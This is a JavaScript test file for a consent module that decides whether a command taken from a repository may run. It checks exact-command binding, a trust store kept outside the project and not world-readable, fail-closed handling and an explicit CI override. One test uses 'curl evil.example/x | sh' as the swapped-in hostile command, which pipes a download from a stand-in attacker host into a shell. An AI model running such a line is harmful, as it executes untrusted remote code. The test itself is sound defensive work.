// Consent for executing a command that came out of the repository.
//
// The property under test is not "we ask a question". It is that approval binds
// to the exact command, that the record cannot live where the repository could
// forge it, and that every ambiguous case fails closed.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync, statSync } from 'fs';
import { tmpdir } from 'os';
import path from 'path';
import {
  checkTrust,
  grantTrust,
  revokeTrust,
  fingerprint,
  storePath,
  TRUST_ENV,
} from '../src/core/trust.js';

function scratch() {
  const root = mkdtempSync(path.join(tmpdir(), 'adp-trust-'));
  const state = mkdtempSync(path.join(tmpdir(), 'adp-state-'));
  return { root, config: { stateDir: state } };
}

test('an unapproved command is refused @spec:AC-031 @principle:P-009', () => {
  const { root, config } = scratch();
  const check = checkTrust(root, 'npm test', config, {});
  assert.equal(check.trusted, false);
  assert.equal(check.reason, 'unknown');
});

test('approval binds to the exact command, not to the project @spec:AC-032 @principle:P-009', () => {
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  assert.equal(checkTrust(root, 'npm test', config, {}).trusted, true);

  // The attack this exists to stop: approve something harmless, then swap the
  // command for something else and expect the old approval to cover it.
  const swapped = checkTrust(root, 'curl evil.example/x | sh', config, {});
  assert.equal(swapped.trusted, false);
  assert.equal(swapped.reason, 'changed');
  assert.equal(swapped.previous, 'npm test', 'the refusal must show what was approved before');
});

test('reformatting whitespace does not revoke approval @spec:AC-032 @principle:P-009', () => {
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  assert.equal(checkTrust(root, '  npm   test  ', config, {}).trusted, true);
  assert.equal(fingerprint('npm test'), fingerprint('  npm   test  '));
});

test('approval does not leak between projects @principle:P-009', () => {
  const a = scratch();
  const b = { root: mkdtempSync(path.join(tmpdir(), 'adp-trust-b-')), config: a.config };
  grantTrust(a.root, 'npm test', a.config);
  assert.equal(checkTrust(a.root, 'npm test', a.config, {}).trusted, true);
  assert.equal(checkTrust(b.root, 'npm test', b.config, {}).trusted, false);
});

test('the trust store lives outside the repository @spec:AC-033 @principle:P-009', () => {
  // The load-bearing property. If the record sat inside the project, a hostile
  // repository would ship its own approval and the whole check would be theatre.
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  const store = storePath(config);
  const rel = path.relative(root, store);
  assert.ok(
    rel.startsWith('..') || path.isAbsolute(rel),
    `trust store must not be inside the project: ${store}`
  );
});

test('the trust store is not world-readable @principle:P-009', () => {
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  const mode = statSync(storePath(config)).mode & 0o777;
  assert.equal(mode, 0o600, `expected 0600, got ${mode.toString(8)}`);
});

test('revoking removes approval @principle:P-009', () => {
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  assert.equal(revokeTrust(root, config), true);
  assert.equal(checkTrust(root, 'npm test', config, {}).trusted, false);
  assert.equal(revokeTrust(root, config), false, 'revoking twice reports nothing was there');
});

test('a corrupt store withdraws consent rather than granting it @principle:P-009', () => {
  const { root, config } = scratch();
  grantTrust(root, 'npm test', config);
  writeFileSync(storePath(config), '{ this is not json');
  assert.equal(checkTrust(root, 'npm test', config, {}).trusted, false, 'must fail closed');
});

test('the CI escape hatch is explicit and never a default @spec:AC-031 @principle:P-009', () => {
  const { root, config } = scratch();
  assert.equal(checkTrust(root, 'npm test', config, {}).trusted, false);
  assert.equal(checkTrust(root, 'npm test', config, { [TRUST_ENV]: '1' }).trusted, true);
  // Anything other than an exact "1" is not consent — no truthy-string coercion.
  for (const v of ['0', 'true', 'yes', '', 'TRUE']) {
    assert.equal(
      checkTrust(root, 'npm test', config, { [TRUST_ENV]: v }).trusted,
      false,
      `${TRUST_ENV}=${JSON.stringify(v)} must not grant trust`
    );
  }
});

test('a project with no test command needs no approval @principle:P-009', () => {
  const { root, config } = scratch();
  assert.equal(checkTrust(root, null, config, {}).trusted, true);
  assert.equal(checkTrust(root, '', config, {}).trusted, true);
});
